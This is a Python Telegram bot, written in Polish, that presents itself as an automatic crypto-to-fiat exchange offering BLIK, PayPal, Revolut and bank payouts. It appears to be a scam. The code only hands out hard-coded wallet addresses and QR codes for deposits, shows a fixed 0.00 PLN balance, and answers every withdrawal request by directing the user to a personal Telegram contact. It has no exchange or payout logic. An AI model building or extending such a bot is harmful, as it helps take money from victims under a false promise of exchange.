import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
)
import qrcode
from io import BytesIO

# --- KONFIGURACJA ---
BOT_TOKEN = os.getenv("BOT_TOKEN") or "TU_WKLEJ_SWÓJ_TOKEN"
ADMIN_ID = 6178640111  # Wstaw swoje ID Telegram

# --- DANE STAŁE ---
crypto_wallets = {
    "Bitcoin (BTC)": "bc1qsnq04cr8mzyna6yr047g4vrl43rzfhr0ppt63y",
    "Ethereum (ETH Network)": "0x6d6F438B2c629A19816F2D07C721bD7C617981d2",
    "Tether USDT (ETH Network)": "0x6d6F438B2c629A19816F2D07C721bD7C617981d2",
    "Litecoin (LTC)": "LWXm8AZ9b18gtQkGM42XPhCH1h48XED8oo"
}

withdraw_methods_buttons = [
    [InlineKeyboardButton("💸 Kod BLIK", callback_data="withdraw|Kod BLIK")],
    [InlineKeyboardButton("🏦 Przelew bankowy (PL)", callback_data="withdraw|Przelew PL")],
    [InlineKeyboardButton("🌍 Przelew zagraniczny", callback_data="withdraw|Przelew EU")],
    [InlineKeyboardButton("💳 PayPal", callback_data="withdraw|PayPal")],
    [InlineKeyboardButton("📲 Revolut", callback_data="withdraw|Revolut")],
    [InlineKeyboardButton("💼 Zen", callback_data="withdraw|Zen")],
    [InlineKeyboardButton("💰 Skrill", callback_data="withdraw|Skrill")]
]

# --- HANDLERY ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📥 Wpłać krypto", callback_data='deposit')],
        [InlineKeyboardButton("📤 Wypłać środki", callback_data='withdraw')],
        [InlineKeyboardButton("💰 Sprawdź saldo", callback_data='balance')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    photo_url = "https://imgur.com/a/3qUzKVy.jpg"  # Zmień na bezpośredni link do obrazka

    await update.message.reply_photo(
        photo=photo_url,
        caption=(
            "<b>🤖 WITAMY W AUTOMATYCZNYM KANTORZE KRYPTOWALUT!</b>\n\n"
            "💸 Wymieniaj <b>Bitcoin, USDT, ETH, Litecoin</b>\n"
            "➡️ Na <b>Kod Blik, PayPal, Revolut, Zen, Przelew Bankowy Polski/Zagraniczny</b>\n\n"
            "WYMIENIMY CI:\n"
            "• <b>min. 150PLN</b>\n"
            "• <b>max. 50 000PLN</b>\n\n"
            "🕒 Działamy non stop – 24/7\n\n"
            "<b>DOŁĄCZ DO GRUPY BOTA, ABY DOWIEDZIEĆ SIĘ O: UPDATE, ZNIŻKACH, NAGRODACH ITD.</b>\n"
            "Grupa Bota - https://t.me/INSTANTCRYPTOEXCH\n\n"
            "👇 Wybierz opcję:"
        ),
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == 'deposit':
        keyboard = [[InlineKeyboardButton(name, callback_data=f"crypto|{name}")] for name in crypto_wallets.keys()]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text("💰 Wybierz kryptowalutę do wpłaty:", reply_markup=reply_markup)

    elif data == 'withdraw':
        reply_markup = InlineKeyboardMarkup(withdraw_methods_buttons)
        await query.message.reply_text("💸 Wybierz metodę wypłaty:", reply_markup=reply_markup)

    elif data == 'balance':
        await query.message.reply_text("<b>💰 Twoje saldo:</b>\n0.00 PLN", parse_mode="HTML")

    elif data.startswith("crypto|"):
        _, name = data.split("|")
        address = crypto_wallets.get(name, "Brak adresu")

        # Generowanie QR
        qr = qrcode.make(address)
        bio = BytesIO()
        bio.name = 'qr.png'
        qr.save(bio, 'PNG')
        bio.seek(0)

        await query.message.reply_photo(
            photo=bio,
            caption=(
                f"<b>{name}</b>\n\n"
                f"🔗 Adres portfela:\n<code>{address}</code>\n\n"
                "📩 Wyślij min 150 PLN, max 50 000 PLN.\n"
                "✅ Po wpłacie wróć i wybierz metodę wypłaty."
            ),
            parse_mode="HTML"
        )

    elif data.startswith("withdraw|"):
        _, method = data.split("|")
        await query.message.reply_text(
            f"✅ Jeżeli wpłaciłeś swoje kryptowaluty, skontaktuj się z <a href='https://t.me/cocaine7_11'>@cocaine7_11</a> i wyślij mu potwierdzenie wysłania krypto.\n"
            "📨 Czekaj na odpowiedź.",
            parse_mode="HTML"
        )

async def check_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return await update.message.reply_text("⛔ Brak dostępu.")
    await update.message.reply_text("🛡️ Panel admina — brak automatycznego monitoringu. Sprawdź saldo w portfelu ręcznie.")

# --- START ---
if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check_admin", check_admin))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("🤖 Bot działa...")
    app.run_polling()
